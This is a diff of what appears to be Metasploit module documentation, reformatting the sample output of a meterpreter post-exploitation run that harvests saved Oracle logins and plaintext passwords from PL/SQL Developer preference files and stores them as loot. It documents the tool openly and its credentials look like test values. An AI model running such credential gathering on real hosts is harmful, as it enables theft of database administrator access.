@@ -33,14 +33,14 @@ meterpreter > run windows/gather/credentials/plsql_developer
 PL/SQL Developer Histories and Credentials
 ==========================================
 
-DisplayName                Username  Database  ConnectAs  Password   FilePath
------------                --------  --------  ---------  --------   --------
-                           sys       ORCL      SYSDBA     oracle     C:\Users\Administrator\AppData\Roaming\PLSQL Developer\Preferences\Administrator\user.prefs
-                           test1     ORCL      Normal                C:\Users\Administrator\AppData\Roaming\PLSQL Developer\Preferences\Administrator\user.prefs
-                           test2     ORCL      Normal     password2  C:\Users\Administrator\AppData\Roaming\PLSQL Developer\Preferences\Administrator\user.prefs
-                           user      server    Normal     password   C:\Users\Administrator\AppData\Roaming\PLSQL Developer\Preferences\Administrator\user.prefs
-Imported Fixed Users/Test  sys       ORCL      SYSDBA     pass       C:\Users\Administrator\AppData\Roaming\PLSQL Developer 15\Preferences\Administrator\user.prefs
-Imported History/Test      sys       ORCL      SYSDBA     oracle     C:\Users\Administrator\AppData\Roaming\PLSQL Developer 14\Preferences\Administrator\user.prefs
+DisplayName                              Username  Database  ConnectAs  Password   FilePath
+-----------                              --------  --------  ---------  --------   --------
+[Connections]/Imported Fixed Users/Test  sys       ORCL      SYSDBA     pass       C:\Users\Administrator\AppData\Roaming\PLSQL Developer 15\Preferences\Administrator\user.prefs
+[Connections]/Imported History/Test      sys       ORCL      SYSDBA     oracle     C:\Users\Administrator\AppData\Roaming\PLSQL Developer 14\Preferences\Administrator\user.prefs
+[LogonHistory]                           test2     ORCL      Normal     password2  C:\Users\Administrator\AppData\Roaming\PLSQL Developer\Preferences\Administrator\user.prefs
+[LogonHistory]                           test1     ORCL      Normal                C:\Users\Administrator\AppData\Roaming\PLSQL Developer\Preferences\Administrator\user.prefs
+[LogonHistory]                           sys       ORCL      SYSDBA     oracle     C:\Users\Administrator\AppData\Roaming\PLSQL Developer\Preferences\Administrator\user.prefs
+[LogonHistory]                           user      server    Normal     password   C:\Users\Administrator\AppData\Roaming\PLSQL Developer\Preferences\Administrator\user.prefs
 
 [+] Passwords stored in: C:/Users/Administrator/.msf4/loot/20231109050433_default_127.0.0.1_host.plsql_devel_357810.txt
 meterpreter >
